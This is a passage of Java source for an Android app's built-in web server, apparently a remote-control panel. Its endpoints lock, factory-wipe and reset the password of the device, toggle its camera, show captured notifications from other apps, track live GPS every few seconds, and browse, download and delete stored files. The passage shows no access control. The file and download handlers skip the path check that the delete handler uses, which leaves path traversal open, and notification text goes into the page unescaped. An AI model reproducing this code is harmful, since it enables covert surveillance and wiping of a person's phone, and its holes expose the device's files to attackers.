                "function updateStatus() { fetch('/admin/status').then(handleResponse).then(data => { document.getElementById('admin-status').innerText = data.active ? 'Active' : 'Inactive'; document.getElementById('admin-status').style.color = data.active ? '#2ecc71' : '#e74c3c'; document.getElementById('camera-status').innerText = data.cameraDisabled ? 'Yes' : 'No'; document.getElementById('camera-toggle-btn').innerHTML = '<div style=\\'font-size: 1.5rem;\\'>&#128247;</div><div style=\\'font-weight: 700;\\'>' + (data.cameraDisabled ? 'Enable Camera' : 'Disable Camera') + '</div>'; }).catch(e => { showAdminMessage('Unable to refresh status: '+e.message, false); }); }" +
                "updateStatus();" +
                "</script>" +
                "</div>" +
                HTML_FOOTER;

        return newFixedLengthResponse(Response.Status.OK, "text/html", html);
    }

    private Response serveAdminStatus() {
        boolean active = isDeviceAdminActive();
        boolean cameraDisabled = false;
        try {
            DevicePolicyManager dpm = getDevicePolicyManager();
            if (dpm != null && active) {
                // Camera state cannot be queried safely on all versions.
            }
        } catch (Exception ignored) {
        }
        String json = "{\"active\": " + active + ", \"cameraDisabled\": " + cameraDisabled + "}";
        return newFixedLengthResponse(Response.Status.OK, "application/json", json);
    }

    private Response performAdminLock() {
        if (!isDeviceAdminActive()) {
            return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": false, \"error\": \"Device Admin not active\"}");
        }
        try {
            getDevicePolicyManager().lockNow();
            return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true, \"message\": \"Device locked successfully\"}");
        } catch (Exception e) {
            return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": false, \"error\": \"Lock failed: " + escapeJson(e.getMessage()) + "\"}");
        }
    }

    private Response performAdminWipe() {
        if (!isDeviceAdminActive()) {
            return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": false, \"error\": \"Device Admin not active\"}");
        }
        try {
            getDevicePolicyManager().wipeData(0);
            return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true, \"message\": \"Factory reset triggered\"}");
        } catch (Exception e) {
            return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": false, \"error\": \"Wipe failed: " + escapeJson(e.getMessage()) + "\"}");
        }
    }

    private Response performAdminCameraToggle(IHTTPSession session) {
        if (!isDeviceAdminActive()) {
            return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": false, \"error\": \"Device Admin not active\"}");
        }
        try {
            Map<String, String> files = new HashMap<>();
            session.parseBody(files);
            String disableValue = session.getParms().get("disable");
            boolean disable = disableValue != null && (disableValue.equals("1") || disableValue.equalsIgnoreCase("true"));
            getDevicePolicyManager().setCameraDisabled(getAdminComponent(), disable);
            return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true}");
        } catch (Exception e) {
            return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": false, \"error\": \"Camera toggle failed: " + escapeJson(e.getMessage()) + "\"}");
        }
    }

    private Response performAdminPasswordReset(IHTTPSession session) {
        if (!isDeviceAdminActive()) {
            return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": false, \"error\": \"Device Admin not active\"}");
        }
        try {
            Map<String, String> files = new HashMap<>();
            session.parseBody(files);
            String password = session.getParms().get("password");
            if (password == null || password.trim().isEmpty()) {
                return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": false, \"error\": \"Password is required\"}");
            }
            boolean result = getDevicePolicyManager().resetPassword(password, 0);
            String message = result ? "Password reset successfully" : "Password reset failed";
            return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": " + result + ", \"message\": \"" + escapeJson(message) + "\"}");
        } catch (Exception e) {
            return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": false, \"error\": \"Password reset failed: " + escapeJson(e.getMessage()) + "\"}");
        }
    }

    // Notifications UI page
    private Response serveNotificationsPage() {
        StringBuilder html = new StringBuilder();
        html.append(HTML_HEADER);
        html.append("<div class=\"card\">");
        html.append("<h2>Notifications</h2>");
        html.append("<div style=\"display:flex; flex-wrap:wrap; gap:10px; align-items:center; margin-bottom:14px;\">");
        html.append("<button onclick=\"clearAll()\" style=\"padding:10px 16px; border-radius:8px; background:#e74c3c; color:#fff; border:none; cursor:pointer;\">Clear All</button>");
        html.append("<div id=\"page-info\" style=\"color:#ccc; font-size:0.95rem;\">Page 1 of 1</div>");
        html.append("<div style=\"margin-left:auto; display:flex; gap:8px;\">");
        html.append("<button id=\"prev-btn\" onclick=\"prevPage()\" style=\"padding:10px 16px; border-radius:8px; background:#444; color:#fff; border:none; cursor:pointer;\">Previous</button>");
        html.append("<button id=\"next-btn\" onclick=\"nextPage()\" style=\"padding:10px 16px; border-radius:8px; background:#444; color:#fff; border:none; cursor:pointer;\">Next</button>");
        html.append("</div>");
        html.append("</div>");
        html.append("<div style=\"overflow:auto; max-height:520px;\">");
        html.append("<table style=\"width:100%; border-collapse:collapse;\"><thead><tr><th style=\"padding:10px; text-align:left; border-bottom:1px solid rgba(255,255,255,0.1);\">Time</th><th style=\"padding:10px; text-align:left; border-bottom:1px solid rgba(255,255,255,0.1);\">App</th><th style=\"padding:10px; text-align:left; border-bottom:1px solid rgba(255,255,255,0.1);\">Title</th><th style=\"padding:10px; text-align:left; border-bottom:1px solid rgba(255,255,255,0.1);\">Text</th><th style=\"padding:10px; text-align:left; border-bottom:1px solid rgba(255,255,255,0.1);\">Action</th></tr></thead>");
        html.append("<tbody id=\"notif-body\"></tbody></table>");
        html.append("</div>");
        html.append("</div>");
        html.append("<script>");
        html.append("var currentPage = 1; var pageSize = 20; var totalPages = 1;");
        html.append("function updateControls() {");
        html.append("  document.getElementById('page-info').textContent = 'Page ' + currentPage + ' of ' + totalPages;");
        html.append("  document.getElementById('prev-btn').disabled = currentPage <= 1;");
        html.append("  document.getElementById('next-btn').disabled = currentPage >= totalPages;");
        html.append("}");
        html.append("function refresh() {");
        html.append("  fetch('/api/notifications?page=' + currentPage + '&size=' + pageSize).then(r=>r.json()).then(function(data){");
        html.append("    if (data && typeof data.page !== 'undefined') { currentPage = data.page; totalPages = data.totalPages; } else { currentPage = 1; totalPages = 1; }");
        html.append("    var body = document.getElementById('notif-body'); body.innerHTML = ''; ");
        html.append("    if (data.notifications && data.notifications.length) {");
        html.append("      data.notifications.forEach(function(n) {");
        html.append("        var tr = document.createElement('tr');");
        html.append("        tr.innerHTML = '<td>'+new Date(n.timestamp).toLocaleString()+'</td><td>'+n.appName+'</td><td>'+n.title+'</td><td>'+n.text+'</td><td><button onclick=\"deleteNotif('+n.id+')\">Delete</button></td>';");
        html.append("        body.appendChild(tr);");
        html.append("      });");
        html.append("    } else {");
        html.append("      var tr = document.createElement('tr');");
        html.append("      tr.innerHTML = '<td colspan=\\\"5\\\" style=\\\"padding:14px; text-align:center; color:#888;\\\">No notifications found.</td>';");
        html.append("      body.appendChild(tr);");
        html.append("    }");
        html.append("    updateControls();");
        html.append("  }).catch(function(e){ console.error(e); updateControls(); });");
        html.append("}");
        html.append("function deleteNotif(id) {");
        html.append("  fetch('/api/notifications/delete',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'id='+encodeURIComponent(id)}).then(function(){refresh();});");
        html.append("}");
        html.append("function clearAll() {");
        html.append("  fetch('/api/notifications/clear',{method:'POST'}).then(function(){ currentPage = 1; refresh(); }).catch(function(e){ console.error(e); });");
        html.append("}");
        html.append("function prevPage() { if (currentPage > 1) { currentPage--; refresh(); } }");
        html.append("function nextPage() { if (currentPage < totalPages) { currentPage++; refresh(); } }");
        html.append("refresh();");
        html.append("</script>");
        html.append(HTML_FOOTER);
        return newFixedLengthResponse(Response.Status.OK, "text/html", html.toString());
    }

    private Response serveNotificationsApi(IHTTPSession session) {
        try {
            Map<String, String> params = session.getParms();
            int page = 1;
            int pageSize = 20;
            try {
                if (params.containsKey("page")) {
                    page = Integer.parseInt(params.get("page"));
                }
                if (params.containsKey("size")) {
                    pageSize = Integer.parseInt(params.get("size"));
                }
            } catch (NumberFormatException ignored) {
            }
            if (page < 1) page = 1;
            if (pageSize < 1) pageSize = 20;
            if (pageSize > 100) pageSize = 100;

            java.util.List<NotificationRecord> list = NotificationStore.getAll();
            int total = list.size();
            int totalPages = total == 0 ? 1 : ((total + pageSize - 1) / pageSize);
            if (page > totalPages) page = totalPages;
            int fromIndex = Math.max(0, (page - 1) * pageSize);
            int toIndex = Math.min(total, fromIndex + pageSize);
            java.util.List<NotificationRecord> pageItems = list.subList(fromIndex, toIndex);

            StringBuilder json = new StringBuilder();
            json.append("{");
            json.append("\"total\":").append(total).append(",");
            json.append("\"page\":").append(page).append(",");
            json.append("\"pageSize\":").append(pageSize).append(",");
            json.append("\"totalPages\":").append(totalPages).append(",");
            json.append("\"notifications\":[");
            boolean first = true;
            for (NotificationRecord r : pageItems) {
                if (!first) json.append(",");
                json.append(r.toJson());
                first = false;
            }
            json.append("]}");
            return newFixedLengthResponse(Response.Status.OK, "application/json", json.toString());
        } catch (Exception e) {
            return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"total\":0,\"page\":1,\"pageSize\":20,\"totalPages\":1,\"notifications\":[]}");
        }
    }

    private Response serveNotificationsClear() {
        try {
            NotificationStore.clear();
            Log.d("RavanHttpServer", "Notifications cleared successfully.");
            return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\":true}");
        } catch (Exception e) {
            Log.d("RavanHttpServer", "Failed to clear notifications: " + e.getMessage());
            return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\":false,\"error\":\"" + escapeJson(e.getMessage()) + "\"}");
        }
    }

    private Response serveNotificationsDelete(IHTTPSession session) {
        try {
            Map<String, String> files = new HashMap<>();
            session.parseBody(files);
            String idStr = session.getParms().get("id");
            if (idStr == null) {
                String postData = files.get("postData");
                if (postData != null && postData.contains("id=")) {
                    idStr = postData.replaceFirst("^.*id=", "");
                    idStr = java.net.URLDecoder.decode(idStr, "UTF-8");
                }
            }
            if (idStr == null || idStr.trim().isEmpty()) {
                return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\":false,\"error\":\"Missing id\"}");
            }
            long id = Long.parseLong(idStr);
            boolean removed = NotificationStore.removeById(id);
            return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\":" + removed + "}");
        } catch (Exception e) {
            return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\":false,\"error\":\"" + escapeJson(e.getMessage()) + "\"}");
        }
    }

    private Response serveNotificationsSettings() {
        try {
            Intent intent = new Intent(android.provider.Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS);
            intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startActivity(intent);
            return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\":true}");
        } catch (Exception e) {
            return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\":false,\"error\":\"" + escapeJson(e.getMessage()) + "\"}");
        }
    }

    private Response serveLocationPage() {
        StringBuilder html = new StringBuilder(HTML_HEADER);
        html.append("<div class=\"card\">");
        html.append("<h2 style=\"margin-bottom: 20px;\">&#128205; GPS Location</h2>");
        html.append("<p style=\"color: #888; font-size: 0.9rem; margin-bottom: 20px;\">Get the device's current GPS coordinates with live tracking</p>");

        // Check permission
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (context.checkSelfPermission(android.Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
                html.append("<div class=\"empty-state\"><div class=\"icon\">&#128274;</div>");
                html.append("<p>Location permission not granted.</p>");
                html.append("<p style=\"margin-top: 10px; font-size: 0.9rem;\">Please grant location permission in the app settings.</p>");
                html.append("</div>");
                html.append("</div>");
                html.append(HTML_FOOTER);
                return newFixedLengthResponse(Response.Status.OK, "text/html", html.toString());
            }
        }

        html.append("<div style=\"margin-bottom: 20px; display: flex; gap: 10px; flex-wrap: wrap;\">");
        html.append("<button id=\"get-location-btn\" onclick=\"getLocation()\" style=\"padding: 14px 28px; background: linear-gradient(135deg, #3498db, #2980b9); border: none; border-radius: 10px; color: white; font-weight: 600; cursor: pointer; font-size: 1rem; transition: all 0.3s ease;\">&#128205; Get Current Location</button>");
        html.append("<button id=\"live-toggle-btn\" onclick=\"toggleLiveTracking()\" style=\"padding: 14px 28px; background: linear-gradient(135deg, #2ecc71, #27ae60); border: none; border-radius: 10px; color: white; font-weight: 600; cursor: pointer; font-size: 1rem; transition: all 0.3s ease;\">&#9654; Start Live Tracking</button>");
        html.append("</div>");

        html.append("<div id=\"loading-indicator\" style=\"display: none; text-align: center; margin-bottom: 20px;\">");
        html.append("<div style=\"display: inline-block; width: 30px; height: 30px; border: 4px solid rgba(52, 152, 219, 0.3); border-top: 4px solid #3498db; border-radius: 50%; animation: spin 1s linear infinite;\"></div>");
        html.append("<div style=\"color: #888; margin-top: 10px; font-size: 0.9rem;\">Fetching location...</div>");
        html.append("</div>");

        html.append("<style>");
        html.append("@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }");
        html.append(".live-update-badge { display: inline-block; padding: 4px 12px; background: rgba(46, 204, 113, 0.2); border: 1px solid #2ecc71; border-radius: 20px; color: #2ecc71; font-size: 0.75rem; font-weight: 600; margin-left: 10px; }");
        html.append(".status-badge { display: inline-block; padding: 4px 12px; background: rgba(233, 69, 96, 0.2); border: 1px solid #e94560; border-radius: 20px; color: #e94560; font-size: 0.75rem; font-weight: 600; margin-left: 10px; }");
        html.append("</style>");

        html.append("<div id=\"location-status\" style=\"text-align: center; color: #888; margin-bottom: 20px; font-size: 0.95rem;\">Click the button to get location</div>");

        html.append("<div id=\"location-result\" style=\"display: none; background: rgba(0,0,0,0.2); border-radius: 12px; padding: 20px;\">");
        html.append("<div style=\"margin-bottom: 20px; padding: 12px; background: rgba(46, 204, 113, 0.1); border-radius: 8px; border-left: 4px solid #2ecc71;\">");
        html.append("<div style=\"display: flex; justify-content: space-between; align-items: center;\">");
        html.append("<div>");
        html.append("<div style=\"font-size: 0.9rem; color: #2ecc71; font-weight: 600;\">Last Updated</div>");
        html.append("<div id=\"last-update-time\" style=\"color: #888; font-size: 0.85rem; margin-top: 4px;\">-</div>");
        html.append("</div>");
        html.append("<div id=\"update-status-badge\" style=\"display: none;\" class=\"live-update-badge\">&#9679; LIVE</div>");
        html.append("</div>");
        html.append("</div>");
        html.append("<div class=\"info-grid\">");
        html.append("<div id=\"lat-item\" class=\"info-item\" style=\"display: none;\"><div class=\"info-label\">Latitude</div><div id=\"lat-value\" class=\"info-value\">-</div></div>");
        html.append("<div id=\"lon-item\" class=\"info-item\" style=\"display: none;\"><div class=\"info-label\">Longitude</div><div id=\"lon-value\" class=\"info-value\">-</div></div>");
        html.append("<div id=\"acc-item\" class=\"info-item\" style=\"display: none;\"><div class=\"info-label\">Accuracy (m)</div><div id=\"acc-value\" class=\"info-value\">-</div></div>");
        html.append("<div id=\"alt-item\" class=\"info-item\" style=\"display: none;\"><div class=\"info-label\">Altitude (m)</div><div id=\"alt-value\" class=\"info-value\">-</div></div>");
        html.append("<div id=\"speed-item\" class=\"info-item\" style=\"display: none;\"><div class=\"info-label\">Speed (m/s)</div><div id=\"speed-value\" class=\"info-value\">-</div></div>");
        html.append("<div id=\"bearing-item\" class=\"info-item\" style=\"display: none;\"><div class=\"info-label\">Bearing (°)</div><div id=\"bearing-value\" class=\"info-value\">-</div></div>");
        html.append("<div id=\"provider-item\" class=\"info-item\" style=\"display: none;\"><div class=\"info-label\">Provider</div><div id=\"provider-value\" class=\"info-value\">-</div></div>");
        html.append("<div id=\"time-item\" class=\"info-item\" style=\"display: none;\"><div class=\"info-label\">Time</div><div id=\"time-value\" class=\"info-value\">-</div></div>");
        html.append("</div>");
        html.append("</div>");

        html.append("<div id=\"error-message\" style=\"display: none; background: rgba(231, 76, 60, 0.2); border-left: 4px solid #e74c3c; padding: 15px; border-radius: 8px; margin-top: 15px;\">");
        html.append("<div style=\"color: #e74c3c; font-weight: 600;\">Error</div>");
        html.append("<div id=\"error-text\" style=\"color: #888; margin-top: 5px;\"></div>");
        html.append("</div>");

        html.append("<script>");
        html.append("let liveTrackingActive = false;");
        html.append("let liveTrackingInterval = null;");
        html.append("let consecutiveErrors = 0;");
        html.append("const MAX_CONSECUTIVE_ERRORS = 5;");
        html.append("");
        html.append("function getLocation() {");
        html.append("  fetchLocationData();");
        html.append("}");
        html.append("");
        html.append("function fetchLocationData() {");
        html.append("  document.getElementById('loading-indicator').style.display = 'block';");
        html.append("  document.getElementById('error-message').style.display = 'none';");
        html.append("  ");
        html.append("  fetch('/location/get').then(r => r.json()).then(data => {");
        html.append("    if (data.success) {");
        html.append("      consecutiveErrors = 0;");
        html.append("      showLocationData(data);");
        html.append("    } else {");
        html.append("      showError(data.error || 'Unknown error');");
        html.append("      if (liveTrackingActive) {");
        html.append("        consecutiveErrors++;");
        html.append("        if (consecutiveErrors >= MAX_CONSECUTIVE_ERRORS) {");
        html.append("          stopLiveTracking();");
        html.append("          showError('Live tracking stopped: Too many consecutive errors');");
        html.append("        }");
        html.append("      }");
        html.append("    }");
        html.append("  }).catch(e => {");
        html.append("    showError('Failed to fetch location: ' + e.message);");
        html.append("    if (liveTrackingActive) {");
        html.append("      consecutiveErrors++;");
        html.append("      if (consecutiveErrors >= MAX_CONSECUTIVE_ERRORS) {");
        html.append("        stopLiveTracking();");
        html.append("        showError('Live tracking stopped: Too many connection errors');");
        html.append("      }");
        html.append("    }");
        html.append("  }).finally(() => {");
        html.append("    document.getElementById('loading-indicator').style.display = 'none';");
        html.append("  });");
        html.append("}");
        html.append("");
        html.append("function toggleLiveTracking() {");
        html.append("  if (liveTrackingActive) {");
        html.append("    stopLiveTracking();");
        html.append("  } else {");
        html.append("    startLiveTracking();");
        html.append("  }");
        html.append("}");
        html.append("");
        html.append("function startLiveTracking() {");
        html.append("  liveTrackingActive = true;");
        html.append("  consecutiveErrors = 0;");
        html.append("  document.getElementById('live-toggle-btn').textContent = '⏸ Stop Live Tracking';");
        html.append("  document.getElementById('live-toggle-btn').style.background = 'linear-gradient(135deg, #e74c3c, #c0392b)';");
        html.append("  document.getElementById('update-status-badge').style.display = 'inline-block';");
        html.append("  ");
        html.append("  fetchLocationData();");
        html.append("  ");
        html.append("  liveTrackingInterval = setInterval(() => {");
        html.append("    if (liveTrackingActive) {");
        html.append("      fetchLocationData();");
        html.append("    }");
        html.append("  }, 3000);");
        html.append("}");
        html.append("");
        html.append("function stopLiveTracking() {");
        html.append("  liveTrackingActive = false;");
        html.append("  if (liveTrackingInterval) {");
        html.append("    clearInterval(liveTrackingInterval);");
        html.append("    liveTrackingInterval = null;");
        html.append("  }");
        html.append("  document.getElementById('live-toggle-btn').textContent = '&#9654; Start Live Tracking';");
        html.append("  document.getElementById('live-toggle-btn').style.background = 'linear-gradient(135deg, #2ecc71, #27ae60)';");
        html.append("  document.getElementById('update-status-badge').style.display = 'none';");
        html.append("}");
        html.append("");
        html.append("function showLocationData(data) {");
        html.append("  document.getElementById('location-status').innerHTML = 'Location obtained successfully';");
        html.append("  document.getElementById('location-result').style.display = 'block';");
        html.append("  document.getElementById('error-message').style.display = 'none';");
        html.append("  ");
        html.append("  const now = new Date();");
        html.append("  const timeString = now.toLocaleTimeString() + ' (' + now.toLocaleDateString() + ')';");
        html.append("  document.getElementById('last-update-time').innerText = timeString;");
        html.append("  ");
        html.append("  if (data.latitude !== undefined) { document.getElementById('lat-item').style.display = 'block'; document.getElementById('lat-value').innerText = data.latitude.toFixed(6); }");
        html.append("  if (data.longitude !== undefined) { document.getElementById('lon-item').style.display = 'block'; document.getElementById('lon-value').innerText = data.longitude.toFixed(6); }");
        html.append("  if (data.accuracy !== undefined) { document.getElementById('acc-item').style.display = 'block'; document.getElementById('acc-value').innerText = data.accuracy.toFixed(2); }");
        html.append("  if (data.altitude !== undefined) { document.getElementById('alt-item').style.display = 'block'; document.getElementById('alt-value').innerText = data.altitude.toFixed(2); }");
        html.append("  if (data.speed !== undefined) { document.getElementById('speed-item').style.display = 'block'; document.getElementById('speed-value').innerText = data.speed.toFixed(2); }");
        html.append("  if (data.bearing !== undefined) { document.getElementById('bearing-item').style.display = 'block'; document.getElementById('bearing-value').innerText = data.bearing.toFixed(2); }");
        html.append("  if (data.provider) { document.getElementById('provider-item').style.display = 'block'; document.getElementById('provider-value').innerText = data.provider; }");
        html.append("  if (data.time) { document.getElementById('time-item').style.display = 'block'; document.getElementById('time-value').innerText = new Date(data.time).toLocaleString(); }");
        html.append("}");
        html.append("");
        html.append("function showError(message) {");
        html.append("  document.getElementById('location-status').innerText = 'Error obtaining location';");
        html.append("  document.getElementById('error-message').style.display = 'block';");
        html.append("  document.getElementById('error-text').innerText = message;");
        html.append("}");
        html.append("</script>");

        html.append("</div>");
        html.append(HTML_FOOTER);

        return newFixedLengthResponse(Response.Status.OK, "text/html", html.toString());
    }

    private Response serveLocationData() {
        try {
            LocationManager locationManager = (LocationManager) context.getSystemService(Context.LOCATION_SERVICE);
            
            if (locationManager == null) {
                String json = "{\"success\": false, \"error\": \"LocationManager service not available\"}";
                return newFixedLengthResponse(Response.Status.OK, "application/json", json);
            }

            // Check if GPS is enabled
            boolean isGpsEnabled = locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER);
            boolean isNetworkEnabled = locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER);

            if (!isGpsEnabled && !isNetworkEnabled) {
                String json = "{\"success\": false, \"error\": \"Location services are disabled. Please enable GPS or Network location in settings.\"}";
                return newFixedLengthResponse(Response.Status.OK, "application/json", json);
            }

            // Check permission
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                if (context.checkSelfPermission(android.Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
                    String json = "{\"success\": false, \"error\": \"Location permission not granted\"}";
                    return newFixedLengthResponse(Response.Status.OK, "application/json", json);
                }
            }

            Location location = null;
            
            // Try GPS first
            if (isGpsEnabled) {
                try {
                    location = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
                } catch (Exception e) {
                    // Permission or other error
                }
            }

            // Fall back to network location
            if (location == null && isNetworkEnabled) {
                try {
                    location = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
                } catch (Exception e) {
                    // Permission or other error
                }
            }

            // Fall back to passive provider
            if (location == null) {
                try {
                    location = locationManager.getLastKnownLocation(LocationManager.PASSIVE_PROVIDER);
                } catch (Exception e) {
                    // Permission or other error
                }
            }

            if (location == null) {
                String json = "{\"success\": false, \"error\": \"No location data available. Location may not have been acquired yet. Try again after a moment.\"}";
                return newFixedLengthResponse(Response.Status.OK, "application/json", json);
            }

            // Build JSON response with location data
            StringBuilder json = new StringBuilder("{\"success\": true, ");
            json.append("\"latitude\": ").append(location.getLatitude()).append(", ");
            json.append("\"longitude\": ").append(location.getLongitude()).append(", ");
            json.append("\"altitude\": ").append(location.getAltitude()).append(", ");
            json.append("\"accuracy\": ").append(location.getAccuracy()).append(", ");
            json.append("\"speed\": ").append(location.getSpeed()).append(", ");
            json.append("\"bearing\": ").append(location.getBearing()).append(", ");
            json.append("\"provider\": \"").append(location.getProvider()).append("\", ");
            json.append("\"time\": ").append(location.getTime());
            json.append("}");

            return newFixedLengthResponse(Response.Status.OK, "application/json", json.toString());

        } catch (SecurityException e) {
            String json = "{\"success\": false, \"error\": \"Permission denied: " + escapeJson(e.getMessage()) + "\"}";
            return newFixedLengthResponse(Response.Status.OK, "application/json", json);
        } catch (Exception e) {
            String json = "{\"success\": false, \"error\": \"Error getting location: " + escapeJson(e.getMessage()) + "\"}";
            return newFixedLengthResponse(Response.Status.OK, "application/json", json);
        }
    }

    private Response serveFiles(String uri, Map<String, String> params) {
        String path = uri.equals("/files") ? "" : uri.substring(7);
        path = path.replace("%20", " ");

        File baseDir = Environment.getExternalStorageDirectory();
        File currentDir = new File(baseDir, path);

        if (!currentDir.exists()) {
            return serve404();
        }

        if (currentDir.isFile()) {
            return serveFileDownload(currentDir);
        }

        StringBuilder html = new StringBuilder(HTML_HEADER);

        // Breadcrumb
        html.append("<div class=\"breadcrumb\">");
        html.append("<a href=\"/files\">Storage</a>");

        if (!path.isEmpty()) {
            String[] parts = path.split("/");
            StringBuilder pathBuilder = new StringBuilder();
            for (String part : parts) {
                if (!part.isEmpty()) {
                    pathBuilder.append("/").append(part);
                    html.append("<span>/</span>");
                    html.append("<a href=\"/files").append(pathBuilder).append("\">").append(part).append("</a>");
                }
            }
        }
        html.append("</div>");

        html.append("<div class=\"card\">");
        html.append("<h2 style=\"margin-bottom: 20px;\">").append(path.isEmpty() ? "Storage" : currentDir.getName())
                .append("</h2>");

        File[] files = currentDir.listFiles();
        if (files != null && files.length > 0) {
            html.append("<ul class=\"file-list\">");

            // Sort: folders first, then files
            java.util.Arrays.sort(files, (a, b) -> {
                if (a.isDirectory() && !b.isDirectory())
                    return -1;
                if (!a.isDirectory() && b.isDirectory())
                    return 1;
                return a.getName().compareToIgnoreCase(b.getName());
            });

            for (File file : files) {
                String fileName = file.getName();
                String filePath = path.isEmpty() ? fileName : path + "/" + fileName;
                String icon = getFileIcon(file);
                String iconClass = getFileIconClass(file);

                html.append("<li class=\"file-item\">");
                html.append("<div class=\"file-icon ").append(iconClass).append("\">").append(icon).append("</div>");
                html.append("<div class=\"file-info\">");
                html.append("<a class=\"file-name\" href=\"/files/").append(filePath).append("\">").append(fileName)
                        .append("</a>");
                html.append("<div class=\"file-meta\">");

                if (file.isDirectory()) {
                    File[] subFiles = file.listFiles();
                    int count = subFiles != null ? subFiles.length : 0;
                    html.append("Folder - ").append(count).append(" items");
                } else {
                    html.append(formatFileSize(file.length())).append(" - ");
                    html.append(new SimpleDateFormat("MMM dd, yyyy", Locale.getDefault())
                            .format(new Date(file.lastModified())));
                }

                html.append("</div></div>");

                String encodedPath;
                try {
                    encodedPath = java.net.URLEncoder.encode(filePath, "UTF-8");
                } catch (java.io.UnsupportedEncodingException e) {
                    encodedPath = filePath;
                }
                if (file.isFile()) {
                    html.append("<a href=\"/download/").append(filePath)
                            .append("\" style=\"padding: 8px 16px; background: rgba(233, 69, 96, 0.2); border-radius: 8px; color: #e94560; text-decoration: none; font-size: 0.85rem; margin-right: 8px;\">Download</a>");
                }
                html.append("<button onclick=\"deletePath('")
                        .append(encodedPath)
                        .append("')\" style=\"padding: 8px 16px; background: rgba(231, 76, 60, 0.15); border: 1px solid #e74c3c; border-radius: 8px; color: #e74c3c; cursor: pointer; font-size: 0.85rem;\">Delete</button>");

                html.append("</li>");
            }
            html.append("</ul>");
        } else {
            html.append(
                    "<div class=\"empty-state\"><div class=\"icon\">&#128237;</div><p>This folder is empty</p></div>");
        }

        html.append("<script>");
        html.append("function deletePath(path) { if (!confirm('Delete this item? This cannot be undone.')) return; fetch('/file/delete?path=' + path, { method: 'GET' }).then(r => r.json()).then(d => { if (d.success) { location.reload(); } else { alert('Delete failed: ' + (d.message || 'Unknown error')); } }).catch(e => { alert('Delete failed: ' + e.message); }); }");
        html.append("</script>");

        html.append("</div>");
        html.append(HTML_FOOTER);

        return newFixedLengthResponse(Response.Status.OK, "text/html", html.toString());
    }

    private Response serveFileDownload(File file) {
        try {
            FileInputStream fis = new FileInputStream(file);
            String mimeType = getMimeType(file.getName());
            Response response = newFixedLengthResponse(Response.Status.OK, mimeType, fis, file.length());
            response.addHeader("Content-Disposition", "attachment; filename=\"" + file.getName() + "\"");
            return response;
        } catch (Exception e) {
            return serveError("Cannot read file: " + e.getMessage());
        }
    }

    private Response serveDownload(String uri) {
        String path = uri.substring(10);
        path = path.replace("%20", " ");
        File baseDir = Environment.getExternalStorageDirectory();
        File file = new File(baseDir, path);

        if (!file.exists() || !file.isFile()) {
            return serve404();
        }

        return serveFileDownload(file);
    }

    private Response deleteFile(Map<String, String> params) {
        String path = params.get("path");
        if (path == null || path.isEmpty()) {
            return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": false, \"message\": \"Path parameter is required\"}");
        }

        path = path.replace("%20", " ");
        File baseDir = Environment.getExternalStorageDirectory();
        File target = new File(baseDir, path);

        try {
            if (!isChildPath(baseDir, target)) {
                return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": false, \"message\": \"Invalid path\"}");
            }

            if (!target.exists()) {
                return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": false, \"message\": \"File or folder does not exist\"}");
            }

            boolean deleted = deleteRecursively(target);
            if (!deleted) {
                return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": false, \"message\": \"Failed to delete item\"}");
            }

            return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true, \"message\": \"Deleted successfully\"}");
        } catch (Exception e) {
            String error = escapeJson(e.getMessage());
            return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": false, \"message\": \"Error deleting item: " + error + "\"}");
        }
    }

    private boolean deleteRecursively(File file) {
        if (file.isDirectory()) {
            File[] children = file.listFiles();
            if (children != null) {
                for (File child : children) {
                    if (!deleteRecursively(child)) {
                        return false;
                    }
                }
            }
        }
        return file.delete();
    }

    private boolean isChildPath(File baseDir, File child) {
        try {
            String basePath = baseDir.getCanonicalPath();
            String childPath = child.getCanonicalPath();
            return childPath.startsWith(basePath + File.separator) || childPath.equals(basePath);
        } catch (Exception e) {
            return false;
        }
    }

    private Response serveCallLogs(Map<String, String> params) {
        StringBuilder html = new StringBuilder(HTML_HEADER);
        html.append("<div class=\"card\">");
        html.append("<h2 style=\"margin-bottom: 20px;\">Recent Call Logs</h2>");

        // Check permission first
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (context.checkSelfPermission(Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
